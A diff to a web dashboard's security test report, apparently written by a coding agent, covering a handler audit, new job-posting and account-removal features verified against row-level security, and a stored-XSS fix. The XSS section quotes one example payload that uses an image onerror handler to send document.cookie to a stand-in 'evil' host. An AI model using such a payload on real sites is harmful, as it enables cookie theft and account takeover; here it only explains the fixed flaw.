@@ -1,12 +1,182 @@
 # Security Test Report
 
-Date: 2026-09-06
+Date: 2026-09-08
 
 ## Result
 
-Passed: 21 / 21 automated tests.
+Passed: 26 / 26 automated tests.
 
-## Latest Update: Finalized Every Tab — Removed 4 Dead Ones, Made Reports & Settings Real
+## Latest Update: Full Button/Logic Audit, Two New Manager Features, and a Stored-XSS Fix
+
+The Manager asked for three things: (1) test every tab, button, and
+piece of logic across the dashboard; (2) a "Work With Us" section where
+a Manager can post and remove job opportunities; (3) a Manager can
+remove any Instructor or Student outright, and an Instructor can
+request a student's removal instead of doing it themselves. No live
+site URL or Manager login was available for this pass either, so the
+audit below is static analysis plus real local-Postgres verification of
+every RLS policy touched — not a browser click-through.
+
+### 1. Full button/logic audit
+
+Every `onclick=`, `onsubmit=`, and `onchange=` handler referenced in
+`src/app.js` was cross-checked against the file's `window.*` export
+list with a small script (`comm` on two sorted, deduped lists) — zero
+handlers were found that reference a function never exported to
+`window`, meaning nothing in the current UI can throw
+"`X is not a function`" from a click. Every `<form>` has a real
+`onsubmit`. Every `<select>` either drives its own form submission
+(has a `name`) or has an explicit `onchange`. No `href="#"` dead links.
+No `TODO`/`FIXME`/"coming soon" markers anywhere in `src/app.js` or
+`src/security.js`.
+
+One real dead button turned up that the previous pass missed: the
+Assignments panel's header had a plain `<button>View submissions</button>`
+with no `onclick` at all, and there is no per-student submissions table
+anywhere in the schema for it to open — `assignments` only stores an
+aggregate `submissions`/`total` count. Building a real submissions-review
+feature (a new table, upload/grading flow) is out of scope for a
+button-audit pass, so — consistent with how the Reports tab's dead PDF
+export was handled last time — the button was removed and replaced with
+a plain assignment count, matching the header style every other list
+panel (Instructors, Leads, Opportunities) already uses.
+
+**Also found: a stored-XSS gap.** `escapeHtml()` was defined in
+`src/app.js` but never called anywhere — every user-submitted string
+(a public review's name/quote, a contact form's name/email/phone/
+message, a staff request's subject/message, a student's notes/family/
+parent fields) was interpolated straight into `innerHTML` unescaped.
+The two most severe surfaces are both writable by anyone on the
+internet with no login at all: the public review form and the public
+contact form. A visitor submitting `<img src=x onerror=fetch('https://
+evil/?c='+document.cookie)>` as a review quote, once a Manager opened
+Reviews to moderate it (or once any visitor loaded the homepage, for an
+*approved* review), would have had that script execute in the viewer's
+browser — a classic stored-XSS-to-account-compromise path against the
+exact people the reviews/leads panels are for.
+
+Fixed by actually using `escapeHtml()` at every render site that
+interpolates user-controlled text: reviews (both the admin panel and
+the public homepage section — the highest-severity spot, since it's
+unauthenticated input rendered to every visitor), contact leads,
+staff request subject/message/instructor name, and student/instructor
+name/email/phone/notes/family/parent fields. `escapeHtml()` itself was
+hardened at the same time — it previously did `String(value)` on
+whatever it was given, so `escapeHtml(null)` returned the literal text
+`"null"` instead of an empty string; every call site chained
+`escapeHtml(x) || fallback` would have silently displayed the word
+"null" instead of the intended "—" for any student with a blank phone,
+family, parent, level, or notes field. `escapeHtml()` now returns `""`
+for `null`/`undefined` before the fallback ever runs, so this was fixed
+at the source rather than patched at each of the six call sites that
+would have hit it. New free-text fields added by this pass (opportunity
+title/description/location) are escaped from the start rather than
+needing a follow-up pass.
+
+### 2. Work With Us (Opportunities)
+
+New `public.opportunities` table
+(`0009_opportunities_and_removal_requests.sql`), modeled on the same
+public-read / Manager-write pattern `reviews` already uses: anyone,
+signed in or not, can read rows where `status = 'open'` — that's what
+powers a new "Work With Us" section on the marketing homepage — and
+only `public.is_admin()` can insert, update, or delete. Verified
+against a real local Postgres instance: an anonymous role reads the one
+seeded `open` row and not the seeded `closed` row, and is rejected with
+"new row violates row-level security policy" on insert; an
+authenticated Manager can insert, update (close/reopen), and delete
+freely.
+
+New **Work With Us** tab (Manager-only, gated by the new
+`canManageOpportunities()` in `src/security.js`) lists every posting
+(open and closed) with **Close**/**Reopen** and **Remove** actions, and
+an **Add opportunity** form. No separate application pipeline was
+built — an interested visitor is pointed at the existing Contact form,
+so applications land in the Contact Requests panel every Manager
+already checks.
+
+### 3. Removing an Instructor or Student
+
+A Manager could already `DELETE` a `students` or `instructors` row
+directly under the RLS policies `0002_production_rls.sql` shipped with
+("students write admin" / "instructors admin write" are both `for all`,
+not just `for update`) — verified this is really true against a real
+Postgres instance before building anything on top of it, rather than
+assuming. What was missing was (a) a UI button to do it, and (b) also
+revoking the person's portal login in the same step, which needs the
+`service_role` key and so can't happen from a plain authenticated
+`DELETE` the way the row deletion itself can.
+
+Added `api/remove-account.js`, following the exact security pattern
+`api/create-account.js` already established: the caller's role is
+re-derived server-side from their own `user_profiles` row using the
+service key, never trusted from the request body. Unlike account
+*issuance*, an Instructor is never allowed to call this endpoint at
+all — not even for their own students — so an approved removal request
+(see below) is carried out under the Manager's own session. Removing an
+Instructor who still has classes assigned is rejected with a 409 naming
+how many classes and asking the Manager to reassign or delete them
+first, since `classes.instructor` is a plain text match rather than a
+real foreign key and the database itself wouldn't otherwise stop a
+class from being left pointing at a deleted instructor.
+
+Verified end to end against a real local Postgres instance, including
+the cascade behavior a code read alone can't confirm: seeded a student
+with an attendance record, a group membership, and a parent link, then
+deleted the student as an authenticated Manager — all three related
+rows were gone afterward, with zero errors, confirming the `on delete
+cascade` foreign keys on `attendance_records`, `group_members`, and
+`parent_student_links` behave as documented rather than assumed.
+
+New **Remove** button on the Instructors tab and **Remove student**
+button on a student's profile panel, both gated by the new
+`canRemoveAccounts()` in `src/security.js` (Manager-only) and behind a
+confirmation prompt, since this is irreversible.
+
+### 4. Instructor removal requests
+
+An Instructor still has no `DELETE` policy on `students` at all —
+verified against a real Postgres instance that an authenticated
+Instructor's `DELETE` on their own class's student affects zero rows,
+same as before this pass. Instead, `staff_requests` gained a third
+`kind`, `'removal'`, carrying `target_student_id`/`target_student_name`
+(plain text snapshots, not real foreign keys — same reasoning as
+`instructor_name` elsewhere in this table: a request is a historical
+record that should survive the student row it named being deleted, not
+disappear or block the deletion). The insert policy was extended so a
+removal request additionally has to name a real student in one of the
+requesting instructor's own classes — verified against a real Postgres
+instance both ways: Instructor A requesting removal of their own
+student succeeds, and the same instructor naming a student in
+Instructor B's class is rejected by RLS before the row is ever written.
+
+The Requests tab's "New request" modal gained a third type with a
+student dropdown scoped to the instructor's own classes
+(`filterStudentsForViewer`, the same scoping the Students tab already
+uses). For a Manager, a removal request's **Approve** button reads
+**Approve & remove** and calls `api/remove-account.js` before marking
+the request `approved` — if the removal itself fails, the request is
+left `pending` rather than silently marked decided for something that
+didn't actually happen.
+
+Re-verified after all of the above: `node --check` on every changed
+`.js` file (`src/app.js`, `src/security.js`, `api/remove-account.js`),
+`npm test` (26/26 — 5 new tests: opportunities/removal permissions,
+the 0009 migration's RLS shape, and `api/remove-account.js`'s
+server-side re-verification, following the same pattern the existing
+`create-account.js` test uses), and `npm run build`.
+
+**Still open, unchanged by this pass:** the visual/CSS redesign the
+Manager asked for previously ("best professional dashboard") still
+hasn't started — every pass so far has been scoped to correctness,
+dead-code removal, and now these three new features. Live click-through
+testing across every role is also still blocked on a site URL and
+Manager login, requested three times now and not yet provided;
+everything above was verified by static analysis and, for every
+RLS-touching change, against a real local Postgres instance — never by
+clicking through the deployed app itself.
+
+## Earlier Update: Finalized Every Tab — Removed 4 Dead Ones, Made Reports & Settings Real
 
 The Manager asked for a final pass over every tab: double-check each one
 and remove anything unimportant. This was done by reading every tab's
